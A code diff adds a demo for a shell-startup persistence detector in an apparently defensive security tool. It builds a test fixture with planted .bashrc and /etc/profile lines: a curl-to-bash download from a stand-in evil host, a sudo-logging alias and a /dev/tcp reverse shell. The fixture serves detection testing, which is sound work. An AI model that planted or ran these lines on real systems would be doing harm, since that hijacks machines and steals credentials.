@@ -6,6 +6,7 @@ from persisthunt.findings import Finding, FindingCollection, Severity
 from persisthunt.detectors.cron import CronDetector
 from persisthunt.detectors.systemd import SystemdDetector
 from persisthunt.detectors.ssh import SSHDetector
+from persisthunt.detectors.shell import ShellDetector
 
 def demo_stage1_findings():
     print("=== Stage 1: Finding Model & Collection Demo ===")
@@ -239,7 +240,63 @@ def demo_stage4_ssh_detector():
             print(f"  Recommendation: {f.recommendation}")
             print()
 
-        print("--- SSH Fixture Findings JSON Output ---")
+
+def demo_stage5_shell_detector():
+    print("\n=== Stage 5: Shell Startup Persistence Detector Demo ===")
+
+    # 1. Live audit on host system
+    print("\n--- Scanning Local Host System (Shell Startup) ---")
+    detector = ShellDetector()
+    print(f"Detector Name: {detector.name}")
+    print(f"Detector Identifier: {detector.detector_id}")
+
+    host_findings = detector.scan()
+    print(f"Host Shell findings detected: {host_findings.count()}")
+    print(f"Host finding severity distribution: {host_findings.severity_counts()}")
+
+    # 2. Emulated audit with suspicious shell persistence
+    print("\n--- Scanning Controlled Suspicious Shell Startup Fixture ---")
+    with TemporaryDirectory() as tmpdir:
+        root = Path(tmpdir)
+        etc = root / "etc"
+        etc.mkdir(parents=True)
+        user_home = root / "home" / "victim"
+        user_home.mkdir(parents=True)
+
+        # Injected backdoor into .bashrc
+        (user_home / ".bashrc").write_text(
+            "# Standard bashrc with persistent backdoor\n"
+            "export PATH=$PATH:/usr/local/bin\n"
+            "curl -fsSL https://evil.example/agent.sh | bash &\n"
+            "/tmp/persist_beacon.sh &\n"
+            "alias sudo='/tmp/.sudo_logger'\n"
+        )
+
+        # System profile with reverse shell
+        (etc / "profile").write_text(
+            "# System profile\n"
+            "/bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1 &\n"
+        )
+
+        mock_detector = ShellDetector(
+            root_prefix=root,
+            system_files=[etc / "profile"],
+            system_dirs=[],
+            home_dir=root / "home",
+        )
+        mock_findings = mock_detector.scan()
+
+        print(f"Fixture findings detected: {mock_findings.count()}")
+        print(f"Severity breakdown: {mock_findings.severity_counts()}")
+        print("\nFindings detail:")
+        for f in mock_findings:
+            print(f"[{f.severity.value}] {f.id} - {f.title}")
+            print(f"  Location: {f.location}")
+            print(f"  Evidence: {f.evidence}")
+            print(f"  Recommendation: {f.recommendation}")
+            print()
+
+        print("--- Shell Fixture Findings JSON Output ---")
         print(json.dumps(mock_findings.to_dict(), indent=2))
 
 
@@ -248,6 +305,7 @@ def main():
     demo_stage2_cron_detector()
     demo_stage3_systemd_detector()
     demo_stage4_ssh_detector()
+    demo_stage5_shell_detector()
 
 if __name__ == "__main__":
     main()
